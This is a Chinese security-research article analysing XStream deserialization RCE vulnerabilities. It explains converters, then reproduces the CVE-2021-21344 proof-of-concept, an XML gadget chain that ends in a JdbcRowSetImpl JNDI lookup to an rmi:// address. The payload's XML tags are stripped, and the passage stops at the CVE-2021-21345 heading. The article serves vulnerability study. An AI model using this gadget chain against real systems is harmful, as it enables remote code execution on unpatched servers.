**作者：Alpha@天融信阿尔法实验室  
原文链接：**
## 前言
Xstream是java中一个使用比较广泛的XML序列化组件，本文以近期Xstream爆出的几个高危RCE漏洞为案例，对Xstream进行分析，同时对POC的构成原理进行讲解
## 1\. Xstream简介
XStream是一个简单的基于Java库，Java对象序列化到XML，反之亦然(即：可以轻易的将Java对象和xml文档相互转换)。
Xstream具有以下优点
  * 使用方便 - XStream的API提供了一个高层次外观，以简化常用的用例。
  * 无需创建映射 - XStream的API提供了默认的映射大部分对象序列化。
  * 性能 - XStream快速和低内存占用，适合于大对象图或系统。
  * 干净的XML - XStream创建一个干净和紧凑XML结果，这很容易阅读。
  * 不需要修改对象 - XStream可序列化的内部字段，如私有和最终字段，支持非公有制和内部类。默认构造函数不是强制性的要求。
  * 完整对象图支持 - XStream允许保持在对象模型中遇到的重复引用，并支持循环引用。
  * 可自定义的转换策略 - 定制策略可以允许特定类型的定制被表示为XML的注册。
  * 安全框架 - XStream提供了一个公平控制有关解组的类型，以防止操纵输入安全问题。
  * 错误消息 - 出现异常是由于格式不正确的XML时，XStream抛出一个统一的例外，提供了详细的诊断，以解决这个问题。
  * 另一种输出格式 - XStream支持其它的输出格式，如JSON。
下面通过一个小案例来演示Xstream如何将java对象序列化成xml数据
首先是两个简单的pojo类，都实现了Serializable接口并且重写了readObject方法
    import java.io.IOException;
    import java.io.Serializable;
    public class People implements Serializable{
        private String name;
        private int age;
        private Company workCompany;
        public People(String name, int age, Company workCompany) {
            this.name = name;
            this.age = age;
            this.workCompany = workCompany;
        }
        public String getName() {
            return name;
        }
        public void setName(String name) {
            this.name = name;
        }
        public int getAge() {
            return age;
        }
        public void setAge(int age) {
            this.age = age;
        }
        public Company getWorkCompany() {
            return workCompany;
        }
        public void setWorkCompany(Company workCompany) {
            this.workCompany = workCompany;
        }
        private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException {
            s.defaultReadObject();
            System.out.println("Read People");
        }
    }
    public class Company implements Serializable {
        private String companyName;
        private String companyLocation;
        public Company(String companyName, String companyLocation) {
            this.companyName = companyName;
            this.companyLocation = companyLocation;
        }
        public String getCompanyName() {
            return companyName;
        }
        public void setCompanyName(String companyName) {
            this.companyName = companyName;
        }
        public String getCompanyLocation() {
            return companyLocation;
        }
        public void setCompanyLocation(String companyLocation) {
            this.companyLocation = companyLocation;
        }
        private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException {
            s.defaultReadObject();
            System.out.println("Company");
        }
    }
然后生成一个People对象，并使用Xstream对其进行序列化
    XStream xStream = new XStream();
    People people = new People("xiaoming",25,new Company("TopSec","BeiJing"));
    String xml = xStream.toXML(people);
    System.out.println(xml);
最后的执行结果如下
          25
          xiaoming
                BeiJing
                TopSec
如果两个pojo类没有实现Serializable接口则序列化后的数据是以下这个样子
      xiaoming
      25
        TopSec
        BeiJing
看到这里，有些同学可能就意识到了，Xstream在处理实现了Serializable接口和没有实现Serializable接口的类生成的对象时，方法是不一样的。
在TreeUnmarshaller类的convertAnother方法处下断点，如下图所示
这里会获取一个converter，中文直译为转换器，Xstream的思路是通过不同的converter来处理序列化数据中不同类型的数据，我们跟进该方法看看在处理最外层的没有实现Serializable接口的People类时用的是哪种converter
从执行的结果中可以看到最终返回一个ReflectionConverter，当然不同的类型在这里会返回不同的Converter，这里仅仅只是处理我们自定义的未实现Serializable接口的People类时使用ReflectionConverter，该Converter的原理是通过反射获取类对象并通过反射为其每个属性进行赋值，那如过是处理实现了Serializable接口并且重写了readObject方法的People类时会有什么不一样呢？
更换序列化后的数据，在同样的位置打上断点，会发现这里处理People的Converter由ReflectionConverter变成了，SerializableConverter。
这是我们尝试在People类的readObject类处打上断点
会发现执行过程中居然调用了我们重写的readObject方法，此时的调用链如下
既然会调用readObject方法的话，那此时我们的思路应该就很清晰了，只需要找到一条利用链，就可以尝试进行反序列化攻击了
## 2\. CVE-2021-21344
下面是漏洞相关POC
          2
                          com.sun.rowset.JdbcRowSetImpl
                              com.sun.rowset.JdbcRowSetImpl
                              getDatabaseMetaData
                              true
                              1
                              UTF-8
                          1008
                          true
                          1000
                          0
                          2
                          0
                          0
                          0
                          true
                          1004
                          false
                          rmi://localhost:15000/CallRemoteMethod
                            -1
                            -1
                            -1
                            -1
                            -1
                            -1
                            -1
                            -1
                            -1
                            -1
                            foo
        3
        javax.xml.ws.binding.attachments.inbound
        javax.xml.ws.binding.attachments.inbound
不难看出最外层封装的类是PriorityQueue，PriorityQueue是实现了Serializable接口并且重写了readObject方法的这点从POC中PriorityQueue的标签上也看得出，结合我们之前对XStream的分析
这次我们直接在PriorityQueued的readObject方法中打上断点。
研究过java反序列化的同学对PriorityQueue这个类肯定不会陌生，经典的CommonCollections利用链中有几个就用到了PriorityQueue，放一下此刻的调用链。
然后我们跟进heapify()方法，
经过一些调试来到了PriorityQueue类的siftDownUsingComparator方法中如下图所示。
这里调用了PriorityQueue类中存储在comparator属性中的对象的compare方法，这时我们回过头来再去看一下POC
我们可以很直观的从XStream序列化的数据中看到PriorityQueue类的comparator属性中存储的是一个`sun.awt.datatransfer.DataTransferer$IndexOrderComparator`类型的对象
也就是说接下来会调用`DataTransferer$IndexOrderComparator`对象的compare方法。
剩下的过程就是一系列的嵌套调用，最终会执行到com.sun.rowset.JdbcRowSetImpl的getDatabaseMetaData中，并最终在JdbcRowSetImpl的connect方法中通过JNDI去lookup事先封装在JdbcRowSetImpl的dataSource中的恶意地址
最后贴一下调用栈
CVE-2021-21344分析至此完毕。
## 2\. CVE-2021-21345
先粘贴一下cve-2021-21345的poc